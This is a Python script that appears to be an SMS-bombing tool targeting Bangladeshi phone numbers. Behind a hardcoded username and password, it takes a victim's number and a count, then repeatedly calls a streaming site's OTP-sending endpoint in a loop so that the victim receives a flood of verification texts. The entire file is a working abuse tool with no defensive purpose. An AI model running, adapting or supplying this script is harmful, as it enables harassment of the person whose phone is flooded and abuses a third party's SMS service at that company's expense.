import os
import requests

upurple = '\033[95m'
byellow = '\033[93m'
igreen = '\033[92m'
bred = '\033[1;31m'
color_off = '\033[0m'

print(upurple+'''\n================================================================'''+color_off)

usern='''IMTIAZ'''
passwd='''HACKER'''

inpuser=str(input(byellow+'''\nEnter The Username: '''+color_off))
inppass=str(input(byellow+'''Enter The Password: '''+color_off))

if usern==inpuser and passwd==inppass:
	print(igreen+'''[✓] Username & Password Correct! '''+color_off)
	
	os.system("clear")
	
	#GET
	number=str(input(" Enter The Number : +88"))

	amount=int(input(" Enter The Amount : "))

	api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"

	for i in range(amount):
	    resp = requests.get(api)
	    print(str(i+1)+" SMS Sent")
	    print(resp.text)

else:
	print(bred+'''[ × ] Incorrect Username! /Password!
                Please Try Again

                    [Contact Admin]  '''+color_off) 

	os.system("xdg-open \'https://www.facebook.com\'")
